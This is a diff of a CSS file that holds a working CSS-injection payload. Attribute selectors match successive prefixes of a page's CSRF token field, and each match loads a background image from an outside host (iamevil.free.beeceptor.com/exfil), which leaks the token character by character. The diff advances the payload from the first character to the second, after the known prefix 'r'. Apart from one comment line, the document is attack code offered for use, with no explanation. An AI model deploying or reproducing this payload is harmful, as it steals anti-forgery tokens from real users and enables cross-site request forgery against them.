@@ -1,187 +1,187 @@
-/* Testing all alphanumeric values for CSRF token field */
-input[name^="csrf"][value^="0"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=0");
+/* Testing all alphanumeric values with 'r' before each value */
+input[name^="csrf"][value^="r0"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r0");
 }
-input[name^="csrf"][value^="1"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=1");
+input[name^="csrf"][value^="r1"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r1");
 }
-input[name^="csrf"][value^="2"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=2");
+input[name^="csrf"][value^="r2"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r2");
 }
-input[name^="csrf"][value^="3"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=3");
+input[name^="csrf"][value^="r3"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r3");
 }
-input[name^="csrf"][value^="4"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=4");
+input[name^="csrf"][value^="r4"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r4");
 }
-input[name^="csrf"][value^="5"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=5");
+input[name^="csrf"][value^="r5"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r5");
 }
-input[name^="csrf"][value^="6"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=6");
+input[name^="csrf"][value^="r6"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r6");
 }
-input[name^="csrf"][value^="7"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=7");
+input[name^="csrf"][value^="r7"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r7");
 }
-input[name^="csrf"][value^="8"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=8");
+input[name^="csrf"][value^="r8"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r8");
 }
-input[name^="csrf"][value^="9"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=9");
+input[name^="csrf"][value^="r9"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r9");
 }
-input[name^="csrf"][value^="a"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=a");
+input[name^="csrf"][value^="ra"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ra");
 }
-input[name^="csrf"][value^="b"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=b");
+input[name^="csrf"][value^="rb"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rb");
 }
-input[name^="csrf"][value^="c"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=c");
+input[name^="csrf"][value^="rc"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rc");
 }
-input[name^="csrf"][value^="d"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=d");
+input[name^="csrf"][value^="rd"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rd");
 }
-input[name^="csrf"][value^="e"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=e");
+input[name^="csrf"][value^="re"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=re");
 }
-input[name^="csrf"][value^="f"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=f");
+input[name^="csrf"][value^="rf"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rf");
 }
-input[name^="csrf"][value^="g"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=g");
+input[name^="csrf"][value^="rg"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rg");
 }
-input[name^="csrf"][value^="h"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=h");
+input[name^="csrf"][value^="rh"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rh");
 }
-input[name^="csrf"][value^="i"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=i");
+input[name^="csrf"][value^="ri"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ri");
 }
-input[name^="csrf"][value^="j"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=j");
+input[name^="csrf"][value^="rj"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rj");
 }
-input[name^="csrf"][value^="k"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=k");
+input[name^="csrf"][value^="rk"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rk");
 }
-input[name^="csrf"][value^="l"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=l");
+input[name^="csrf"][value^="rl"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rl");
 }
-input[name^="csrf"][value^="m"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=m");
+input[name^="csrf"][value^="rm"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rm");
 }
-input[name^="csrf"][value^="n"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=n");
+input[name^="csrf"][value^="rn"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rn");
 }
-input[name^="csrf"][value^="o"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=o");
+input[name^="csrf"][value^="ro"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ro");
 }
-input[name^="csrf"][value^="p"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=p");
+input[name^="csrf"][value^="rp"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rp");
 }
-input[name^="csrf"][value^="q"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=q");
+input[name^="csrf"][value^="rq"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rq");
 }
-input[name^="csrf"][value^="r"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=r");
+input[name^="csrf"][value^="rr"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rr");
 }
-input[name^="csrf"][value^="s"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=s");
+input[name^="csrf"][value^="rs"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rs");
 }
-input[name^="csrf"][value^="t"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=t");
+input[name^="csrf"][value^="rt"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rt");
 }
-input[name^="csrf"][value^="u"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=u");
+input[name^="csrf"][value^="ru"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ru");
 }
-input[name^="csrf"][value^="v"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=v");
+input[name^="csrf"][value^="rv"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rv");
 }
-input[name^="csrf"][value^="w"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=w");
+input[name^="csrf"][value^="rw"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rw");
 }
-input[name^="csrf"][value^="x"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=x");
+input[name^="csrf"][value^="rx"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rx");
 }
-input[name^="csrf"][value^="y"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=y");
+input[name^="csrf"][value^="ry"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ry");
 }
-input[name^="csrf"][value^="z"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=z");
+input[name^="csrf"][value^="rz"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rz");
 }
-input[name^="csrf"][value^="A"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=A");
+input[name^="csrf"][value^="rA"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rA");
 }
-input[name^="csrf"][value^="B"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=B");
+input[name^="csrf"][value^="rB"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rB");
 }
-input[name^="csrf"][value^="C"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=C");
+input[name^="csrf"][value^="rC"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rC");
 }
-input[name^="csrf"][value^="D"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=D");
+input[name^="csrf"][value^="rD"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rD");
 }
-input[name^="csrf"][value^="E"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=E");
+input[name^="csrf"][value^="rE"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rE");
 }
-input[name^="csrf"][value^="F"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=F");
+input[name^="csrf"][value^="rF"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rF");
 }
-input[name^="csrf"][value^="G"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=G");
+input[name^="csrf"][value^="rG"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rG");
 }
-input[name^="csrf"][value^="H"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=H");
+input[name^="csrf"][value^="rH"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rH");
 }
-input[name^="csrf"][value^="I"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=I");
+input[name^="csrf"][value^="rI"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rI");
 }
-input[name^="csrf"][value^="J"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=J");
+input[name^="csrf"][value^="rJ"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rJ");
 }
-input[name^="csrf"][value^="K"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=K");
+input[name^="csrf"][value^="rK"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rK");
 }
-input[name^="csrf"][value^="L"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=L");
+input[name^="csrf"][value^="rL"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rL");
 }
-input[name^="csrf"][value^="M"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=M");
+input[name^="csrf"][value^="rM"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rM");
 }
-input[name^="csrf"][value^="N"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=N");
+input[name^="csrf"][value^="rN"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rN");
 }
-input[name^="csrf"][value^="O"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=O");
+input[name^="csrf"][value^="rO"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rO");
 }
-input[name^="csrf"][value^="P"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=P");
+input[name^="csrf"][value^="rP"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rP");
 }
-input[name^="csrf"][value^="Q"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=Q");
+input[name^="csrf"][value^="rQ"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rQ");
 }
-input[name^="csrf"][value^="R"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=R");
+input[name^="csrf"][value^="rR"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rR");
 }
-input[name^="csrf"][value^="S"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=S");
+input[name^="csrf"][value^="rS"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rS");
 }
-input[name^="csrf"][value^="T"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=T");
+input[name^="csrf"][value^="rT"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rT");
 }
-input[name^="csrf"][value^="U"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=U");
+input[name^="csrf"][value^="rU"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rU");
 }
-input[name^="csrf"][value^="V"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=V");
+input[name^="csrf"][value^="rV"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rV");
 }
-input[name^="csrf"][value^="W"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=W");
+input[name^="csrf"][value^="rW"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rW");
 }
-input[name^="csrf"][value^="X"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=X");
+input[name^="csrf"][value^="rX"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rX");
 }
-input[name^="csrf"][value^="Y"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=Y");
+input[name^="csrf"][value^="rY"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rY");
 }
-input[name^="csrf"][value^="Z"] {
-    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=Z");
+input[name^="csrf"][value^="rZ"] {
+    background-image: url("https://iamevil.free.beeceptor.com/exfil?char=rZ");
 }
